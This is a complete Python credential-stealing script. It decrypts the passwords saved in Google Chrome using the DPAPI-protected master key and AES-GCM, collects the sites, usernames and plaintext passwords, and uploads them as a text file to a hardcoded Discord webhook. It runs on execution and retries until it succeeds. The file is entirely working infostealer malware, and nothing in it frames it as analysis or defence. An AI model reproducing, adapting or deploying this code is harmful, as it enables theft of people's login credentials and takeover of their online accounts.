import os
import sys
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import io
from datetime import datetime, timedelta
from discord import SyncWebhook, File


def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    chrome_dir = get_chrome_directory()
    local_state_path = os.path.join(chrome_dir, "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def get_chrome_directory():
    system = sys.platform
    if system == "win32":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
    elif system == "darwin":
        return os.path.expanduser("~/Library/Application Support/Google/Chrome/")
    else:
        return os.path.expanduser("~/.config/google-chrome/")


def send_to_webhook(passwords_str):
    webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1111719322482655242/9082Zwui2shAfEd-uOgWfDJhENd7OjA5K2CRrDMIgYfBB3OE15mQWFQAsH9yFlOlkUhh")
    # Convert the string to an in-memory text stream for sending as a file
    file_buffer = io.StringIO(passwords_str)
    webhook.send(file=File(file_buffer, filename="chrome_passwords.txt"))


def main():
    chrome_dir = get_chrome_directory()
    encrypted_file_path = os.path.join(chrome_dir, "Default", "Login Data")

    # get the AES key
    key = get_encryption_key()

    filename = "ChromeData.db"
    shutil.copyfile(encrypted_file_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

    passwords_str = ""  # String buffer to store all password data

    try:
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]

            if username or password:
                passwords_str += f"Origin URL: {origin_url}\n"
                passwords_str += f"Action URL: {action_url}\n"
                passwords_str += f"Username: {username}\n"
                passwords_str += f"Password: {password}\n"

            if date_created != 86400000000 and date_created:
                passwords_str += f"Creation date: {str(get_chrome_datetime(date_created))}\n"

            if date_last_used != 86400000000 and date_last_used:
                passwords_str += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"

            passwords_str += "=" * 50 + "\n"

        cursor.close()
        db.close()

        # Remove the copied db file
        try:
            os.remove(filename)
        except:
            pass

        # Send the string data to the webhook
        send_to_webhook(passwords_str)

    except Exception as e:
        print(f"An error occurred: {e}")


while True:
    try:
        main()
        break
    except Exception as e:
        print("An error occurred:", e)
        print("Retrying...")
